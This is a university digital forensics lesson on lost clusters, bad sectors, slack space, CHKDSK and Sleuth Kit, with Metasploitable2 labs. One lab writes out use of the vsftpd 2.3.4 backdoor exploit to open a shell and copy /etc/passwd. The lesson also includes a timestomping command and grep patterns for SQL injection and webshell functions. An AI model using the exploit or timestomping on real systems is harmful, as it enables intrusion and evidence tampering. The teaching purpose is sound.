# Digital Forensics — Part 7: Lost Clusters, Bad Sectors & Slack Area

> **Course:** Digital Forensics | **Level:** University (Cybersecurity Department)
> **Lab Environment:** Windows CMD, Metasploitable2 (VM), personal web apps
> **Prerequisite Topics:** Hard disk structure, platters, tracks, sectors, clusters, FAT/NTFS

---

## Table of Contents

1. [Hard Disk Structure Recap](#1-hard-disk-structure-recap)
2. [File Allocation Table (FAT)](#2-file-allocation-table-fat)
3. [What Are Clusters?](#3-what-are-clusters)
4. [Lost Clusters (Orphan Clusters)](#4-lost-clusters-orphan-clusters)
5. [Causes of Lost Clusters](#5-causes-of-lost-clusters)
6. [Lost Clusters vs Bad Sectors](#6-lost-clusters-vs-bad-sectors)
7. [Logical vs Physical Errors](#7-logical-vs-physical-errors)
8. [Slack Area (File Slack)](#8-slack-area-file-slack)
9. [File Systems Overview](#9-file-systems-overview)
10. [Practical Lab: CHKDSK Command](#10-practical-lab-chkdsk-command)
11. [Extended Lab: Forensic Investigation Workflow](#11-extended-lab-forensic-investigation-workflow)
12. [Metasploitable2 Lab Extensions](#12-metasploitable2-lab-extensions)
13. [Forensic Tools Reference](#13-forensic-tools-reference)
14. [Hacking Techniques Context (White / Gray / Black Hat)](#14-hacking-techniques-context-white--gray--black-hat)
15. [Key Concepts Cheat Sheet](#15-key-concepts-cheat-sheet)

---

## 1. Hard Disk Structure Recap

Understanding where data physically lives is the foundation of forensics.

```
Platter
  └── Tracks (concentric circles on the platter surface)
        └── Sectors (small fixed-size slices of each track — 512 bytes each)
              └── Clusters (logical groups of consecutive sectors)
```

| Component | Description                                 | Typical Size                                      |
| --------- | ------------------------------------------- | ------------------------------------------------- |
| Platter   | Spinning magnetic disk                      | Physical disk                                     |
| Track     | Concentric ring on a platter                | Varies                                            |
| Sector    | Smallest addressable storage unit           | 512 bytes (legacy) / 4096 bytes (Advanced Format) |
| Cluster   | Group of sectors — the OS's allocation unit | 4 KB – 64 KB (configurable)                       |

**Why this matters in forensics:** Deleted files leave data in sectors/clusters until overwritten. Understanding the structure lets investigators recover this data.

---

## 2. File Allocation Table (FAT)

The **File Allocation Table (FAT)** is a data structure the operating system uses to keep track of which clusters are:

- **Free** — available for use
- **Allocated** — assigned to a file
- **Bad** — marked as damaged, do not use
- **Lost/Orphaned** — marked as in-use but with no file pointing to them

### FAT Variants

| File System | Full Name                    | Typical Use                         |
| ----------- | ---------------------------- | ----------------------------------- |
| FAT12       | File Allocation Table 12-bit | Floppy disks                        |
| FAT16       | File Allocation Table 16-bit | Older Windows, small drives         |
| FAT32       | File Allocation Table 32-bit | USB drives, SD cards, older Windows |
| exFAT       | Extended FAT                 | Large USB/SD cards, modern Windows  |
| NTFS        | New Technology File System   | Modern Windows (default)            |
| EXT2/3/4    | Extended File System         | Linux                               |
| APFS        | Apple File System            | macOS, iOS                          |

**How FAT works conceptually:**

```
FAT Table Entry:
  Cluster 0  → [Reserved]
  Cluster 1  → [Reserved]
  Cluster 2  → 0x0003  (points to next cluster of a file)
  Cluster 3  → 0xFFFF  (end of file marker)
  Cluster 4  → 0x0000  (FREE)
  Cluster 5  → 0xFFF7  (BAD SECTOR marker)
  Cluster 6  → 0x0007  (in-use, but no directory entry → LOST CLUSTER)
```

---

## 3. What Are Clusters?

When the OS saves a file, it does **not** write byte-by-byte. It allocates space in **cluster-sized chunks**.

### Example

- File size: 700 bytes
- Sector size: 512 bytes
- Cluster size: 2 sectors = 1024 bytes

```
┌─────────────────────────────────┐
│         Allocated Cluster       │
│  ┌──────────┬──────────┐        │
│  │ Sector 1 │ Sector 2 │        │
│  │ 512 bytes│ 512 bytes│        │
│  └──────────┴──────────┘        │
│                                 │
│  File data: 700 bytes           │
│  Used: 700 bytes                │
│  Slack Area: 324 bytes (empty)  │
└─────────────────────────────────┘
```

Even though the file only needs 700 bytes, the OS allocates the entire 1024-byte cluster. The remaining **324 bytes is the Slack Area** (covered in detail in Section 8).

---

## 4. Lost Clusters (Orphan Clusters)

### Definition

A **lost cluster** (also called an **orphan cluster**) is a cluster that:

- Is marked as **"in use"** in the FAT/file system table
- Has **no corresponding directory entry** (no file claims it)
- Contains data that the OS cannot attribute to any file

### Visualization

```
FAT Table:
  Cluster 10 → USED ✓     ← but which file? → [no directory entry found]
  Cluster 11 → USED ✓     ← no file either  → [no directory entry found]

These are LOST CLUSTERS — the OS thinks they're occupied but can't find the owner.
```

### Why Are Lost Clusters Important in Forensics?

- They may contain **fragments of deleted files**
- They can hold **residual data from malware**
- They can be used for **data hiding** (anti-forensic technique)
- They indicate **file system corruption** worth investigating

---

## 5. Causes of Lost Clusters

### Cause 1: File Allocation Table Errors

The FAT gets written in two stages:

1. OS marks the cluster as allocated in FAT
2. OS writes the directory entry linking the file to those clusters

If the system crashes **between these two steps**, the cluster is marked used but never linked — a lost cluster is born.

### Cause 2: Cluster Marked "Used" Without Being Assigned to a File

A race condition or software bug causes the FAT to mark a cluster as occupied before the file write is complete, then the write fails.

### Cause 3: Improper File Closure

```
Scenario:
  User opens file → edits → [power cut / force shutdown]
  OS never gets to finalize FAT entries → lost cluster
```

**How to reproduce safely for learning:**

- Open a large file in Notepad or Word
- Force-kill the process via Task Manager (`taskkill /F /IM notepad.exe`)
- Run `chkdsk` to see if any orphan clusters appear

### Cause 4: Improper System Shutdown

Shutting down the computer without closing applications can leave FAT entries in a "dirty" state.

```
Normal shutdown:
  App saves → App closes → OS flushes FAT → power off ✓

Forced shutdown:
  [Power pulled] → FAT never flushed → clusters left marked "in use" ✗
```

### Cause 5: Disk Corruption / Bad Drivers / Resource Conflicts

- Faulty USB/SATA cables can cause incomplete writes
- Incorrect or outdated drivers for storage controllers
- I/O conflicts between simultaneous disk operations

---

## 6. Lost Clusters vs Bad Sectors

This is a critical distinction for forensics exams and real investigations.

| Feature           | Lost Cluster                           | Bad Sector                              |
| ----------------- | -------------------------------------- | --------------------------------------- |
| Type of error     | **Logical**                            | **Physical**                            |
| Cause             | File system / OS error                 | Physical damage to disk surface         |
| Visible to OS     | Marked as "in use" in FAT              | Marked as `0xFFF7` in FAT               |
| Data recoverable? | **Yes** — data often intact            | Often **No** — magnetic surface damaged |
| Repairable?       | **Yes** — `chkdsk /f` fixes it         | Rarely — requires specialized tools     |
| Detected by       | `chkdsk`, forensic tools               | `chkdsk`, S.M.A.R.T., `badblocks`       |
| Forensic value    | High — may contain hidden/deleted data | Low — data physically destroyed         |

### Bad Sectors Deep Dive

Bad sectors can be:

1. **Soft bad sectors** — logical errors (incorrect ECC checksum) — sometimes recoverable
2. **Hard bad sectors** — physical damage (scratches, magnetic decay) — permanent

**Detection on Linux/Metasploitable2:**

```bash
# Scan for bad sectors (read-only, safe on evidence drives)
sudo badblocks -v /dev/sda > bad_sectors.txt

# Using smartmontools (best for HDD health)
sudo apt-get install smartmontools
sudo smartctl -a /dev/sda

# S.M.A.R.T. attributes to watch:
# ID 5   - Reallocated Sector Count
# ID 187 - Reported Uncorrectable Errors
# ID 197 - Current Pending Sector Count
# ID 198 - Uncorrectable Sector Count
```

---

## 7. Logical vs Physical Errors

### Physical Errors

- Actual hardware damage
- Scratches, head crashes, magnetic decay, fire/water damage
- Require specialized data recovery labs (clean rooms)
- Examples: bad sectors, head crash, platter damage

### Logical Errors

- Software-level corruption
- FAT/MFT corruption, lost clusters, file system inconsistencies
- Repairable with software tools
- Examples: lost clusters, corrupted MBR, orphaned directory entries

```
Error Types:
  ┌──────────────────────────────────────────────────────┐
  │                   DISK ERRORS                        │
  │                                                      │
  │   Physical              Logical                      │
  │   ────────              ───────                      │
  │   Bad Sectors           Lost Clusters                │
  │   Head Crash            Corrupted FAT                │
  │   Platter Scratch       Orphaned MFT entries         │
  │   Controller Failure    Dirty shutdown marks         │
  │                                                      │
  │   Not software-fixable  Software-fixable             │
  └──────────────────────────────────────────────────────┘
```

---

## 8. Slack Area (File Slack)

### Definition

**Slack Area** is the wasted space between the end of a file's actual data and the end of the cluster(s) allocated to it.

### Types of Slack Space

| Type            | Location                                    | Description                                            |
| --------------- | ------------------------------------------- | ------------------------------------------------------ |
| **File Slack**  | End of last cluster of a file               | Most common — unused space after file data ends        |
| **RAM Slack**   | Sector containing EOF to end of that sector | Contains RAM contents at time of write (older systems) |
| **Drive Slack** | Sectors after RAM slack in the cluster      | Usually zeroed or contains old data                    |

### Calculation Example

```
Cluster size: 4096 bytes (8 sectors × 512 bytes)
File size:    1500 bytes

Sectors used:
  Sector 1: 512 bytes of file data  (bytes 0–511)
  Sector 2: 512 bytes of file data  (bytes 512–1023)
  Sector 3: 476 bytes of file data  (bytes 1024–1499) ← file ends here
             + 36 bytes of RAM Slack (zero-filled or old RAM data)
  Sectors 4–8: 2560 bytes of Drive Slack (old data or zeros)

Total slack: 36 (RAM) + 2560 (drive) = 2596 bytes of slack
```

### Why Slack Space Matters in Forensics

1. **Data remnants** — old file data survives in the slack of a new file
2. **Steganography/hiding** — attackers can hide data in slack space
3. **Evidence recovery** — fragments of passwords, documents, conversations
4. **Malware** — some rootkits store payloads in slack space

### Practical: Finding Slack Space with Forensic Tools

```bash
# On Linux with The Sleuth Kit (TSK)
sudo apt-get install sleuthkit

# List file system info including cluster size
fsstat /dev/sda1

# List files with slack space info
fls -r /dev/sda1 | head -50

# Extract file slack data
istat /dev/sda1 <inode_number>

# Dump raw cluster data (find slack)
blkcat /dev/sda1 <block_number> <count>
```

**On a test disk image (safe for learning):**

```bash
# Create a test disk image
dd if=/dev/zero of=test_disk.img bs=1M count=100
mkfs.fat test_disk.img

# Mount and write test files
sudo mount -o loop test_disk.img /mnt/test
echo "Hello" > /mnt/test/tiny_file.txt
sudo umount /mnt/test

# Now examine slack with TSK
fsstat test_disk.img
fls test_disk.img
```

---

## 9. File Systems Overview

### NTFS (New Technology File System)

Used by modern Windows. Replaces FAT with the **Master File Table (MFT)**.

```
NTFS Key Structures:
  $MFT        — Master File Table (metadata for every file)
  $MFTMirr    — Backup of first 4 MFT entries
  $LogFile    — Transaction log for journaling
  $Bitmap     — Tracks which clusters are in use
  $Boot       — Boot sector
  $BadClus    — Bad cluster list
  $Secure     — Security descriptors
  $UpCase     — Unicode uppercase table
```

### FAT32 vs NTFS Comparison

| Feature               | FAT32  | NTFS       |
| --------------------- | ------ | ---------- |
| Max file size         | 4 GB   | 16 EB      |
| Max volume            | 8 TB   | 256 TB     |
| Permissions           | No     | Yes (ACLs) |
| Journaling            | No     | Yes        |
| Encryption            | No     | Yes (EFS)  |
| Compression           | No     | Yes        |
| Lost cluster recovery | CHKDSK | CHKDSK     |

### EXT4 (Linux)

```bash
# View EXT4 filesystem details
sudo tune2fs -l /dev/sda1

# Check filesystem for errors
sudo e2fsck -n /dev/sda1   # -n = read-only, don't fix

# View inode info for a file
stat /path/to/file

# Find files with no directory entries (lost+found)
sudo fsck -n /dev/sda1
```

---

## 10. Practical Lab: CHKDSK Command

### Overview

`CHKDSK` (Check Disk) is the built-in Windows tool for detecting and repairing file system errors including lost clusters.

### Lab Setup

- **OS:** Windows 10/11
- **Privilege:** Administrator required
- **Target:** Any local drive (C:, D:) or attached external drive

### Step 1: Open Elevated Command Prompt

```
1. Press Win + S → type "cmd"
2. Right-click "Command Prompt" → "Run as administrator"
3. Click "Yes" on UAC prompt
```

### Step 2: Basic CHKDSK Scan (Read-Only)

```cmd
chkdsk C:
```

**What it checks:**

- File system structure integrity
- Lost clusters / orphan clusters
- Bad sectors
- Index (directory) consistency
- Security descriptor validity

**Sample output (healthy drive):**

```
Windows has scanned the file system and found no problems.
 26,213,375 KB total disk space.
 12,840,620 KB in 89,412 files.
    204,924 KB in 31,456 indexes.
          0 KB in bad sectors.        ← No bad sectors
    226,211 KB in use by the system.
         65 KB occupied by the log file.
 12,941,620 KB available on disk.

          4,096 bytes in each allocation unit.
      6,553,343 total allocation units on disk.
      3,235,405 allocation units available on disk.
```

**Sample output (with lost clusters):**

```
Errors found. CHKDSK found lost clusters.

  23 lost allocation units found in 4 chains.
   Convert lost chains to files (Y/N)?
```

### Step 3: Scan and Fix Lost Clusters

```cmd
chkdsk C: /f
```

- `/f` — Fix errors (requires drive to be unmounted or scheduled on reboot)
- If C: is the system drive, Windows will schedule it for next boot

```cmd
chkdsk C: /f /r
```

- `/r` — Locate bad sectors AND recover readable information (includes `/f`)
- Takes significantly longer — does physical sector scan

```cmd
chkdsk C: /f /r /x
```

- `/x` — Force dismount before scan (for non-system drives)

### Step 4: Scan a Specific Drive

```cmd
:: Switch to D drive
D:

:: Run CHKDSK on D
chkdsk D: /f /r

:: For external drive (e.g., K:)
chkdsk K: /f /r /x
```

### Step 5: Repair Disk

```cmd
chkdsk C: /scan
```

- `/scan` — Online scan (Windows 8+), can run without dismounting
- Reports issues without fixing them immediately

```cmd
chkdsk C: /spotfix
```

- `/spotfix` — Fixes only logged corruption issues quickly

### CHKDSK Parameters Reference

| Parameter  | Description                          |
| ---------- | ------------------------------------ |
| `/f`       | Fix errors                           |
| `/r`       | Scan for bad sectors + recover data  |
| `/x`       | Force dismount                       |
| `/scan`    | Online scan (Win 8+)                 |
| `/spotfix` | Quick fix of logged issues           |
| `/b`       | Re-evaluate bad clusters (NTFS only) |
| `/v`       | Verbose output                       |

### Step 6: View CHKDSK Results in Event Viewer

```
1. Win + R → eventvwr.msc
2. Windows Logs → Application
3. Filter by Source: "Wininit" or "Chkdsk"
4. Find the most recent CHKDSK event
```

Or via PowerShell:

```powershell
Get-WinEvent -Log Application | Where-Object {$_.ProviderName -match "Wininit"} | Select-Object -First 5 | Format-List
```

---

## 11. Extended Lab: Forensic Investigation Workflow

This section covers how to apply the above concepts in a real forensic investigation workflow — suitable for testing on your own systems and websites.

### Lab 1: Disk Imaging (Preserving Evidence)

Before touching any evidence, always create a forensic image.

```bash
# On Linux (Kali, Ubuntu, Metasploitable host)
# Create a bit-for-bit image of a drive
sudo dd if=/dev/sdb of=/evidence/disk_image.dd bs=4096 conv=noerror,sync status=progress

# Better: use dcfldd (forensic dd with hashing)
sudo apt-get install dcfldd
sudo dcfldd if=/dev/sdb of=/evidence/disk.img hash=sha256 hashlog=/evidence/hash.txt

# Even better: use ewfacquire (E01 format with metadata)
sudo apt-get install libewf-dev ewf-tools
sudo ewfacquire /dev/sdb
```

**Verify image integrity:**

```bash
md5sum /evidence/disk_image.dd > /evidence/disk_image.md5
sha256sum /evidence/disk_image.dd > /evidence/disk_image.sha256
```

### Lab 2: Mount Image Read-Only

```bash
# Mount the image without modifying it
sudo mkdir /mnt/evidence
sudo mount -o ro,loop,noexec /evidence/disk_image.dd /mnt/evidence

# For NTFS images
sudo mount -t ntfs -o ro,loop /evidence/disk_image.dd /mnt/evidence
```

### Lab 3: Find Lost Clusters with The Sleuth Kit

```bash
# Install TSK
sudo apt-get install sleuthkit

# Get filesystem info
fsstat /evidence/disk_image.dd

# List all files including deleted
fls -r -d /evidence/disk_image.dd | head -100
# -r = recursive
# -d = show deleted files

# Get info on a specific inode
istat /evidence/disk_image.dd <inode>

# Recover a specific file by inode
icat /evidence/disk_image.dd <inode> > /evidence/recovered_file

# Identify orphan/lost clusters
dls -e /evidence/disk_image.dd > /evidence/unallocated_space.raw
```

### Lab 4: Slack Space Extraction

```bash
# Extract slack space from a disk image
# Using TSK's blkls
blkls /evidence/disk_image.dd > /evidence/slack_data.raw

# Search slack for keywords (e.g., passwords, emails)
strings /evidence/slack_data.raw | grep -i "password\|email\|secret\|key"

# Or use bulk_extractor for automated extraction
sudo apt-get install bulk-extractor
bulk_extractor -o /evidence/bulk_output /evidence/disk_image.dd
```

### Lab 5: Timeline Analysis

```bash
# Create a filesystem timeline
fls -r -m "/" /evidence/disk_image.dd > /evidence/bodyfile.txt

# Convert to timeline format
mactime -b /evidence/bodyfile.txt -d > /evidence/timeline.csv

# View events in a date range
mactime -b /evidence/bodyfile.txt 2024-01-01 2024-12-31
```

---

## 12. Metasploitable2 Lab Extensions

Metasploitable2 is deliberately vulnerable — perfect for practicing forensic artifact collection.

### Setup

```
Host:           Kali Linux (attacker/analyst)
Target:         Metasploitable2 VM
Network:        Host-Only Adapter (isolated)
Metasploitable: 192.168.56.101 (default)
Kali:           192.168.56.102
```

### Lab A: Generate Forensic Artifacts on Metasploitable2

```bash
# From Kali — exploit a service to create artifacts
# (Use only on your own lab VMs)

# 1. Exploit vsftpd 2.3.4 backdoor (port 21)
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.56.101
run
# → shell session opens

# 2. On the Metasploitable shell, create some files
echo "secret_key=abc123" > /tmp/hidden_data.txt
mkdir /tmp/test_dir
cp /etc/passwd /tmp/test_dir/

# 3. Delete the files (to practice recovery)
rm /tmp/hidden_data.txt
```

### Lab B: Forensic Analysis of Metasploitable2 Disk

```bash
# On Kali — acquire the Metasploitable disk via SSH
# (If you have SSH access via Metasploitable's default creds)
# Default: msfadmin/msfadmin

# Create image over SSH
ssh msfadmin@192.168.56.101 "sudo dd if=/dev/sda bs=4096" | dd of=/kali/metasploitable.img

# Or mount the VM's .vmdk directly (power off VM first)
# In Kali:
sudo apt-get install qemu-utils
qemu-img convert -f vmdk Metasploitable.vmdk -O raw metasploitable.img

# Mount and analyze
sudo losetup -f --show metasploitable.img
# Note the loop device (e.g., /dev/loop0)
sudo partprobe /dev/loop0
sudo mount -o ro /dev/loop0p1 /mnt/meta

# Now analyze with TSK
fsstat /dev/loop0p1
fls -r -d /dev/loop0p1 | grep "hidden_data"
```

### Lab C: Detect Lost Clusters on EXT2 (Metasploitable uses EXT2/3)

```bash
# Check EXT filesystem
sudo e2fsck -n /dev/loop0p1

# View superblock info
sudo dumpe2fs /dev/loop0p1 | head -50

# Find lost+found contents
sudo ls -la /mnt/meta/lost+found/

# Inode analysis
sudo debugfs /dev/loop0p1
# Inside debugfs:
#   lsdel       ← list deleted inodes
#   undel <inode> <filename>  ← recover file
#   q           ← quit
```

### Lab D: Web Application Forensics (Your Own Websites)

Since you've built your own web applications, you can test forensic artifact collection from web servers.

#### Apache/Nginx Log Analysis

```bash
# Access logs — who visited what and when
cat /var/log/apache2/access.log

# Error logs — crashed processes, bad file handles
cat /var/log/apache2/error.log

# Find POST requests (form submissions, login attempts)
grep "POST" /var/log/apache2/access.log

# Find SQL injection attempts in logs
grep -i "union\|select\|drop\|insert\|exec\|script" /var/log/apache2/access.log

# Timeline of web requests
cat /var/log/apache2/access.log | awk '{print $4}' | sort | uniq -c | sort -rn
```

#### PHP File Upload Forensics

```bash
# Find recently modified PHP files (potential webshells)
find /var/www/html -name "*.php" -mtime -7 -ls

# Find hidden files
find /var/www/html -name ".*"

# Check for suspicious PHP functions
grep -r "eval\|base64_decode\|system\|exec\|passthru\|shell_exec" /var/www/html/ --include="*.php"
```

#### Database Forensics (MySQL on your test apps)

```bash
# Check MySQL binary logs (records all queries)
sudo mysqlbinlog /var/log/mysql/mysql-bin.000001

# Check MySQL error log
sudo cat /var/log/mysql/error.log

# Find deleted records (if binary logging was on)
mysqlbinlog --start-datetime="2024-01-01 00:00:00" /var/log/mysql/mysql-bin.* | grep "DELETE"

# Check for unauthorized accounts
mysql -u root -p -e "SELECT User, Host, authentication_string FROM mysql.user;"
```

---

## 13. Forensic Tools Reference

### Windows Tools

| Tool            | Purpose                    | Command           |
| --------------- | -------------------------- | ----------------- |
| CHKDSK          | Disk error checking        | `chkdsk C: /f /r` |
| Disk Management | GUI disk view              | `diskmgmt.msc`    |
| WinHex          | Hex editor, disk forensics | GUI               |
| Autopsy         | Full forensic suite (free) | GUI               |
| FTK Imager      | Disk imaging               | GUI               |
| Recuva          | File recovery              | GUI               |
| PECmd           | Windows Prefetch analysis  | CLI               |
| RegRipper       | Registry analysis          | CLI               |

### Linux / Kali Tools

| Tool             | Purpose               | Install                      |
| ---------------- | --------------------- | ---------------------------- |
| `dd` / `dcfldd`  | Disk imaging          | `apt install dcfldd`         |
| `sleuthkit`      | File system analysis  | `apt install sleuthkit`      |
| `autopsy`        | GUI front-end for TSK | `apt install autopsy`        |
| `foremost`       | File carving          | `apt install foremost`       |
| `scalpel`        | File carving          | `apt install scalpel`        |
| `bulk_extractor` | Feature extraction    | `apt install bulk-extractor` |
| `volatility`     | Memory forensics      | `apt install volatility`     |
| `binwalk`        | Firmware analysis     | `apt install binwalk`        |
| `e2fsck`         | EXT filesystem check  | Built-in                     |
| `debugfs`        | EXT debug shell       | Built-in                     |
| `photorec`       | Photo/file recovery   | `apt install testdisk`       |
| `testdisk`       | Partition recovery    | `apt install testdisk`       |

### Metasploitable2 Specific Tools (On Kali)

```bash
# Install essential forensics toolkit
sudo apt-get update
sudo apt-get install -y \
  sleuthkit \
  autopsy \
  foremost \
  scalpel \
  bulk-extractor \
  dcfldd \
  ewf-tools \
  testdisk \
  volatility \
  binwalk \
  wireshark \
  tcpdump \
  nmap \
  metasploit-framework
```

---

## 14. Hacking Techniques Context (White / Gray / Black Hat)

> **Legal Notice:** Only perform these techniques on systems you own, have explicit written permission to test, or on dedicated lab VMs (Metasploitable2, DVWA, your own web apps). Unauthorized access is illegal.

### Hat Definitions

| Hat           | Description                                                              | Legal Status                  |
| ------------- | ------------------------------------------------------------------------ | ----------------------------- |
| **White Hat** | Authorized security testing, bug bounty, penetration testing             | Legal                         |
| **Gray Hat**  | May test without explicit permission but reports findings without malice | Ethically gray, legally risky |
| **Black Hat** | Unauthorized access, data theft, malware distribution                    | Illegal                       |

> As a cybersecurity student, you operate exclusively as **White Hat** on your own systems and Metasploitable2.

### Techniques Relevant to Disk Forensics

#### Anti-Forensic Techniques (Know These to Counter Them)

**1. Data Hiding in Slack Space**

```python
# Conceptual — how data can be hidden in slack space
# (Understanding this helps you find it during investigations)

# Attacker writes a small file to a large cluster
# Then manually writes hidden data in the slack area using a hex editor
# The OS ignores the slack — only forensic tools find it

# Detection: bulk_extractor, strings, hex editors
strings /dev/sda1 | grep -i "hidden\|secret\|key"
```

**2. Timestamp Manipulation (Timestomping)**

```bash
# Attackers change file timestamps to evade timeline analysis
touch -t 202001010000 malicious_file.php

# Detection: Compare $STANDARD_INFORMATION vs $FILE_NAME timestamps in NTFS
# Using TSK:
istat /dev/sda1 <inode>
# $STANDARD_INFORMATION and $FILE_NAME timestamps should match
# If they differ → timestomping detected
```

**3. File System Tunneling**

Windows has a feature called "file system tunneling" — if you delete a file and recreate it with the same name within a short window, Windows restores the original timestamps. Attackers exploit this. Forensics: check both timestamp attributes.

**4. Steganography**

```bash
# Detection: find files with suspicious size/content ratio
# Images should have predictable sizes; anomalies suggest hidden data

# Tool: steghide, steganalysis
sudo apt-get install steghide
steghide info suspicious_image.jpg

# Detect LSB steganography
zsteg image.png
```

#### White Hat / Forensic Countermeasures

**1. Write Blockers**

Always use a hardware or software write blocker when examining evidence to prevent accidental modification.

```bash
# Software write blocker on Linux
sudo hdparm -r1 /dev/sdb   # Set read-only

# Or mount read-only
sudo mount -o ro /dev/sdb1 /mnt/evidence
```

**2. Chain of Custody**

Document every action:

```
Evidence Item: HDD SN: ABC123456
Acquired by: [Your Name]
Date/Time: 2024-01-15 14:32:00 UTC
Hash (SHA256): abc123...
Tool Used: dcfldd v1.3.4
Notes: Drive received in anti-static bag, powered on
```

**3. Automated Artifact Collection (Triage)**

```bash
#!/bin/bash
# Forensic triage script for your test systems
# Run on YOUR systems only

CASE="case_$(date +%Y%m%d_%H%M%S)"
mkdir -p /evidence/$CASE

# System info
uname -a > /evidence/$CASE/system_info.txt
hostname >> /evidence/$CASE/system_info.txt
date >> /evidence/$CASE/system_info.txt

# Running processes
ps aux > /evidence/$CASE/processes.txt

# Network connections
netstat -antp > /evidence/$CASE/network.txt

# Logged in users
who > /evidence/$CASE/users.txt
last > /evidence/$CASE/login_history.txt

# Recently modified files
find / -mtime -1 -type f 2>/dev/null > /evidence/$CASE/recent_files.txt

# Bash history
cp ~/.bash_history /evidence/$CASE/bash_history.txt

echo "Triage complete: /evidence/$CASE"
```

---

## 15. Key Concepts Cheat Sheet

```
┌──────────────────────────────────────────────────────────────────┐
│                    DIGITAL FORENSICS PART 7                      │
│                      QUICK REFERENCE                             │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  CLUSTER     = Group of sectors (OS allocation unit)            │
│  FAT         = File Allocation Table (tracks cluster usage)     │
│  LOST CLUSTER= In FAT as "used" but no file claims it           │
│  ORPHAN      = Another name for lost cluster                    │
│  BAD SECTOR  = Physically damaged sector (can't store data)     │
│  SLACK AREA  = Empty space at end of last cluster of a file     │
│  LOGICAL ERR = Software/OS-level error (fixable)               │
│  PHYSICAL ERR= Hardware damage (often permanent)                │
│                                                                  │
├──────────────────────────────────────────────────────────────────┤
│  COMMANDS (Windows)                                              │
│  chkdsk C:         → Scan C: for errors                         │
│  chkdsk C: /f      → Fix errors                                 │
│  chkdsk C: /f /r   → Fix errors + scan bad sectors             │
│  chkdsk D: /f /r /x→ External drive: force dismount + fix      │
├──────────────────────────────────────────────────────────────────┤
│  COMMANDS (Linux)                                                │
│  badblocks -v /dev/sda    → Scan for bad sectors               │
│  e2fsck -n /dev/sda1      → Check EXT filesystem (read-only)   │
│  fsstat image.dd          → TSK filesystem stats               │
│  fls -r -d image.dd       → List including deleted files       │
│  icat image.dd <inode>    → Extract file by inode              │
│  blkls image.dd           → Extract unallocated space          │
├──────────────────────────────────────────────────────────────────┤
│  FILE SYSTEMS                                                    │
│  FAT32   → USB, SD cards, max 4GB file size                    │
│  NTFS    → Windows default, journaling, encryption             │
│  EXT4    → Linux default, journaling                           │
│  APFS    → macOS/iOS, encryption, snapshots                    │
└──────────────────────────────────────────────────────────────────┘
```

### Review Questions

1. What is the difference between a lost cluster and a bad sector?
2. Why is the slack area important in a forensic investigation?
3. What command would you run to find and fix lost clusters on Windows drive D:?
4. A cluster is marked as "in use" in the FAT but no file has a directory entry pointing to it. What is this called?
5. What type of error is a lost cluster — logical or physical? Explain why.
6. If a 900-byte file is stored on a volume with 4096-byte clusters, how much slack space is there?
7. Why must forensic investigators always hash disk images?
8. What does `fls -r -d` do in The Sleuth Kit?

### Answers

1. Lost cluster = logical error (software), FAT marks it used but no file owns it, recoverable. Bad sector = physical damage, the disk surface itself is broken, usually unrecoverable.
2. Slack space can contain fragments of old files, deleted data, or intentionally hidden data that persists even after the current file's data ends.
3. `chkdsk D: /f /r /x`
4. Lost cluster (orphan cluster)
5. Logical — because the hard disk is not physically damaged; the error is in the file system's bookkeeping (FAT), which is software-managed.
6. 4096 − 900 = **3196 bytes** of slack space
7. To prove the image is an exact, unmodified copy of the original evidence (chain of custody, integrity verification)
8. Recursively lists all files including deleted ones from a disk image

---

_Document prepared for Digital Forensics coursework — Part 7_
_Test all labs only on systems you own or have explicit permission to test_
